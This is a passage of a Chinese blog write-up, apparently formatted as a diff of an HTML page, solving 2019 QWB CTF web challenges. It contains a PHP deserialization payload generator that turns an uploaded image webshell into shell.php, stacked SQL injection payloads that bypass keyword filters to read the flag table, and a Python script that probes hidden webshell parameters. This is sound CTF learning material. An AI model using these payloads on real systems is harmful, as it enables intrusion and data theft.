class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="最终用下面生成的-EXP-作为-cookies-访问网页，即可将原来上传的图片马名字修改成-shell-php-，依次找-flag-即可。"><a href="#最终用下面生成的-EXP-作为-cookies-访问网页，即可将原来上传的图片马名字修改成-shell-php-，依次找-flag-即可。" class="headerlink" title="最终用下面生成的 EXP 作为 cookies 访问网页，即可将原来上传的图片马名字修改成 shell.php ，依次找 flag 即可。"></a>最终用下面生成的 EXP 作为 cookies 访问网页，即可将原来上传的图片马名字修改成 shell.php ，依次找 flag 即可。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($checker)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="comment"># 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER['REMOTE_ADDR'])/md5($_FILES['upload_file']['name']).".png"</span></span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">'./upload/2e25bf05f23b63a5b1f744933543d723/00bf23e130fa1e525e332ff03dae345d.png'</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'./upload/2e25bf05f23b63a5b1f744933543d723/shell.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">'index'</span> =&gt; <span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-upload-3.PNG" alt></p>
+<h6 id="魔法方法的测试"><a href="#魔法方法的测试" class="headerlink" title="魔法方法的测试"></a>魔法方法的测试</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">liangjie</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">'1'</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'2'</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $execpt=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">($arguments)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ext)&#123;</span><br><span class="line">            print_r($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问不可调用的资源时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execpt[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ljdd520=<span class="keyword">new</span> liangjie();</span><br><span class="line">$ljdd520-&gt;index(<span class="string">"liangjie"</span>,<span class="string">"liyu"</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="图片木马的生成方式"><a href="#图片木马的生成方式" class="headerlink" title="图片木马的生成方式:"></a>图片木马的生成方式:</h6><h6 id="https-ljdd520-github-io-2020-01-16-E5-9B-BE-E7-89-87-E6-9C-A8-E9-A9-AC-E5-88-B6-E4-BD-9C-E5-A4-A7-E6-B3-95-more"><a href="#https-ljdd520-github-io-2020-01-16-E5-9B-BE-E7-89-87-E6-9C-A8-E9-A9-AC-E5-88-B6-E4-BD-9C-E5-A4-A7-E6-B3-95-more" class="headerlink" title="https://ljdd520.github.io/2020/01/16/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%B3%95/#more"></a><a href="https://ljdd520.github.io/2020/01/16/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%B3%95/#more" target="_blank" rel="noopener">https://ljdd520.github.io/2020/01/16/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%B3%95/#more</a></h6><h5 id="0x02-随便注"><a href="#0x02-随便注" class="headerlink" title="0x02 随便注"></a>0x02 随便注</h5><h6 id="由于是赛后复现因此我们先看看源码："><a href="#由于是赛后复现因此我们先看看源码：" class="headerlink" title="由于是赛后复现因此我们先看看源码："></a>由于是赛后复现因此我们先看看源码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmap是没有灵魂的 --&gt;</span><br><span class="line">&lt;form method=<span class="string">"get"</span>&gt;</span><br><span class="line">    姿势: &lt;input type=<span class="string">"text"</span> name=<span class="string">"inject"</span> value=<span class="string">"1"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span><span class="params">($inject)</span> </span>&#123;</span><br><span class="line">    preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject) &amp;&amp; <span class="keyword">die</span>(<span class="string">'return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span><span class="params">($inject)</span> </span>&#123;</span><br><span class="line">    strstr($inject, <span class="string">"set"</span>) &amp;&amp; strstr($inject, <span class="string">"prepare"</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">'strstr($inject, "set") &amp;&amp; strstr($inject, "prepare")'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'inject'</span>])) &#123;</span><br><span class="line">    $id = $_GET[<span class="string">'inject'</span>];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = <span class="keyword">new</span> mysqli(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"supersqli"</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    $sql = <span class="string">"select * from `words` where id = '$id';"</span>;</span><br><span class="line"></span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($rs = $mysqli-&gt;store_result())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> ($mysqli-&gt;more_results())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>($mysqli-&gt;next_result()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"error "</span>.$mysqli-&gt;errno.<span class="string">" : "</span>.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h6><h6 id="fuzz一下，会发现ban了以下字符："><a href="#fuzz一下，会发现ban了以下字符：" class="headerlink" title="fuzz一下，会发现ban了以下字符："></a>fuzz一下，会发现ban了以下字符：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;, $inject);</span><br></pre></td></tr></table></figure>
+
+<h6 id="发现支持多语句查询。查表语句为："><a href="#发现支持多语句查询。查表语句为：" class="headerlink" title="发现支持多语句查询。查表语句为："></a>发现支持多语句查询。查表语句为：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.154:8302/?inject=0%27%3Bshow+tables%3B%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-1.PNG" alt></p>
+<h6 id="由于过滤了select等关键字，我们可以用预编译来构造带有select的sql语句。"><a href="#由于过滤了select等关键字，我们可以用预编译来构造带有select的sql语句。" class="headerlink" title="由于过滤了select等关键字，我们可以用预编译来构造带有select的sql语句。"></a>由于过滤了select等关键字，我们可以用预编译来构造带有select的sql语句。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(&apos;sel&apos;,&apos;ect * from `1919810931114514`&apos;);</span><br><span class="line">prepare presql from @sql;</span><br><span class="line">execute presql;</span><br><span class="line">deallocate prepare presql;</span><br></pre></td></tr></table></figure>
+
+<h6 id="结果显示："><a href="#结果显示：" class="headerlink" title="结果显示："></a>结果显示：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</span><br></pre></td></tr></table></figure>
+
+<h6 id="既然是用strstr来匹配关键字，那么直接大小写关键字绕过："><a href="#既然是用strstr来匹配关键字，那么直接大小写关键字绕过：" class="headerlink" title="既然是用strstr来匹配关键字，那么直接大小写关键字绕过："></a>既然是用strstr来匹配关键字，那么直接大小写关键字绕过：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.154:8302/?inject=1%27%3bSet+%40sqll%3dconcat(%27sel%27,%27ect+*+from+`1919810931114514`%27)%3bPrepare+presql+from+%40sqll%3bexecute+presql%3bdeallocate+Prepare+presql%3b%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-2.PNG" alt></p>
+<h6 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h6><h6 id="知识点：堆叠注入"><a href="#知识点：堆叠注入" class="headerlink" title="知识点：堆叠注入"></a>知识点：堆叠注入</h6><h6 id="先来随便测试一下，看看是否有注入。"><a href="#先来随便测试一下，看看是否有注入。" class="headerlink" title="先来随便测试一下，看看是否有注入。"></a>先来随便测试一下，看看是否有注入。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1%27+or+%271%27%3D%271</span><br><span class="line">/?inject=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-3.PNG" alt></p>
+<h6 id="测试一下过滤了哪些函数："><a href="#测试一下过滤了哪些函数：" class="headerlink" title="测试一下过滤了哪些函数："></a>测试一下过滤了哪些函数：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-4.PNG" alt></p>
+<h6 id="过滤了select-update-delete-drop-insert-where和-。"><a href="#过滤了select-update-delete-drop-insert-where和-。" class="headerlink" title="过滤了select,update,delete,drop,insert,where和.。"></a>过滤了select,update,delete,drop,insert,where和.。</h6><h6 id="那么我们测试一波看看是不是有堆叠注入。"><a href="#那么我们测试一波看看是不是有堆叠注入。" class="headerlink" title="那么我们测试一波看看是不是有堆叠注入。"></a>那么我们测试一波看看是不是有堆叠注入。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos;%3Bshow+databases%3B%23</span><br><span class="line">/?inject=1&apos;;show databases;#</span><br><span class="line">``` </span><br><span class="line">![](https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-5.PNG)</span><br><span class="line">###### 接下来看看有什么表。</span><br><span class="line">```text</span><br><span class="line">/?inject=1&apos;%3Bshow+tables%3B%23</span><br><span class="line">/?inject=1&apos;;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-6.PNG" alt></p>
+<h6 id="我们可以看看这个数字为名字的表里面有什么。看看有没有flag。"><a href="#我们可以看看这个数字为名字的表里面有什么。看看有没有flag。" class="headerlink" title="我们可以看看这个数字为名字的表里面有什么。看看有没有flag。"></a>我们可以看看这个数字为名字的表里面有什么。看看有没有flag。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos;%3Bshow+columns+from+`1919810931114514`%3B%23</span><br><span class="line">/?inject=1&apos;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-7.PNG" alt></p>
+<h6 id="然后是words表，看起来就是默认查询的表了。"><a href="#然后是words表，看起来就是默认查询的表了。" class="headerlink" title="然后是words表，看起来就是默认查询的表了。"></a>然后是words表，看起来就是默认查询的表了。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1%27%3Bshow+columns%20from%20`words`%3B%23</span><br><span class="line">/?inject=1&apos;;show columns from `words`;#</span><br></pre></td></tr></table></figure>
+
+<h6 id="它既然没有过滤alter和rename，那么我们是不是可以把表改个名字，再给列改个名字吗？先把words改名为words1，再把这个数字表改名为words，然后把新的words里的flag列改为id-避免一开始无法查询-。这样就可以让程序直接查询出flag了。"><a href="#它既然没有过滤alter和rename，那么我们是不是可以把表改个名字，再给列改个名字吗？先把words改名为words1，再把这个数字表改名为words，然后把新的words里的flag列改为id-避免一开始无法查询-。这样就可以让程序直接查询出flag了。" class="headerlink" title="它既然没有过滤alter和rename，那么我们是不是可以把表改个名字，再给列改个名字吗？先把words改名为words1，再把这个数字表改名为words，然后把新的words里的flag列改为id(避免一开始无法查询)。这样就可以让程序直接查询出flag了。"></a>它既然没有过滤alter和rename，那么我们是不是可以把表改个名字，再给列改个名字吗？先把words改名为words1，再把这个数字表改名为words，然后把新的words里的flag列改为id(避免一开始无法查询)。这样就可以让程序直接查询出flag了。</h6><h6 id="构造的payload如下，然后访问，看到这个看来就执行到最后一个语句了。"><a href="#构造的payload如下，然后访问，看到这个看来就执行到最后一个语句了。" class="headerlink" title="构造的payload如下，然后访问，看到这个看来就执行到最后一个语句了。"></a>构造的payload如下，然后访问，看到这个看来就执行到最后一个语句了。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1%27;RENAME%20TABLE%20`words`%20TO%20`words1`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;#</span><br><span class="line"></span><br><span class="line">/?inject=1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-8.PNG" alt></p>
+<h6 id="用1-39-or-39-1-39-39-1访问一下。"><a href="#用1-39-or-39-1-39-39-1访问一下。" class="headerlink" title="用1&#39; or &#39;1&#39;=&#39;1访问一下。"></a>用<code>1&#39; or &#39;1&#39;=&#39;1</code>访问一下。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1%27+or+%271%27%3D%271#</span><br><span class="line">/?inject=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-9.PNG" alt></p>
+<h5 id="0x03-高明的黑客"><a href="#0x03-高明的黑客" class="headerlink" title="0x03 高明的黑客"></a>0x03 高明的黑客</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-smarthacker-1.PNG" alt></p>
+<h6 id="从题目的源码来看，好像黑客留了shell，我们需要从这些源码中找到正真的shell-。"><a href="#从题目的源码来看，好像黑客留了shell，我们需要从这些源码中找到正真的shell-。" class="headerlink" title="从题目的源码来看，好像黑客留了shell，我们需要从这些源码中找到正真的shell.。"></a>从题目的源码来看，好像黑客留了shell，我们需要从这些源码中找到正真的shell.。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-smarthacker-2.png" alt></p>
+<h6 id="我们先搜搜常见的shell，类似eval-GET-xx-或者system-GET-xx-。这里通过程序来寻找shell。"><a href="#我们先搜搜常见的shell，类似eval-GET-xx-或者system-GET-xx-。这里通过程序来寻找shell。" class="headerlink" title="我们先搜搜常见的shell，类似eval($_GET[xx])或者system($_GET[xx])。这里通过程序来寻找shell。"></a>我们先搜搜常见的shell，类似<code>eval($_GET[xx])</code>或者<code>system($_GET[xx])</code>。这里通过程序来寻找shell。</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">'uname'</span></span><br><span class="line">            flag = <span class="string">'Linux'</span></span><br><span class="line">            <span class="comment"># command = 'phpinfo();'</span></span><br><span class="line">            <span class="comment"># flag = 'phpinfo'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">'http://127.0.0.1:8888/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">'http://127.0.0.1:8888/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-smarthacker-3.png" alt></p>
+<h6 id="最终发现正真的shell，直接连上查找flag即可。"><a href="#最终发现正真的shell，直接连上查找flag即可。" class="headerlink" title="最终发现正真的shell，直接连上查找flag即可。"></a>最终发现正真的shell，直接连上查找flag即可。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-smarthacker-4.png" alt></p>
+<h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-mochazz-github-io-2019-05-27-2019-E5-BC-BA-E7-BD-91-E6-9D-AFWeb-E9-83-A8-E5-88-86-E9-A2-98-E8-A7-A3-upload"><a href="#https-mochazz-github-io-2019-05-27-2019-E5-BC-BA-E7-BD-91-E6-9D-AFWeb-E9-83-A8-E5-88-86-E9-A2-98-E8-A7-A3-upload" class="headerlink" title="https://mochazz.github.io/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#upload"></a><a href="https://mochazz.github.io/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#upload" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#upload</a></h6><h6 id="https-www-zhaoj-in-read-5873-html"><a href="#https-www-zhaoj-in-read-5873-html" class="headerlink" title="https://www.zhaoj.in/read-5873.html"></a><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/16/图片木马制作大法/" rel="next" title="图片木马制作大法">
+                <i class="fa fa-chevron-left"></i> 图片木马制作大法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
